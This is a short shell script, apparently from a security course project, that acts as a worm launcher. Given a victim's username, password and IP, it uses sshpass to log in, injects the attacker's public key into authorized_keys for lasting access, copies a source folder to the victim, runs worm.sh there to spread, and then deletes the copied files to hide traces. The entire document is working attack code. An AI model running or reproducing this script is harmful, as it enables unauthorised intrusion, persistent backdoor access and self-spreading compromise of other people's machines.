#/bin/sh

usage() {
  echo "Usage: $0 <target username> <target password> <target IP>" 1>&2;
  exit 1;
}

ssh_key_inject() {
  sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "mkdir -m 700 ~/.ssh/"
  sshpass -p "$victim_password" scp "$public_key" "$victim_username"@"$victim_ip":"$key_inject_location"
}

payload() {
  local victim_username="$1"
  local victim_password="$2"
  local victim_ip="$3"
  local public_key="/home/cs2019/.ssh/id_rsa.pub"
  local key_inject_location="~/.ssh/authorized_keys"
  local src_dir="$PWD/src"
  local target_dir="/home/victim"
  echo "Launching SSH-Key Inject..."
  ssh_key_inject
  echo "Worms Replication through SSH..."
  sshpass -p "$victim_password" scp -r "$src_dir" "$victim_username"@"$victim_ip":"$target_dir"
  # Launching Worm...
  sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "cd $target_dir/src && ./worm.sh"
  echo "Removeing Trace..."
  sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "rm -rf $target_dir/src"
}

main() {
  if [ "$#" -eq 3 ]; then
    payload "$1" "$2" "$3"
  else
    usage
  fi
}
main $*
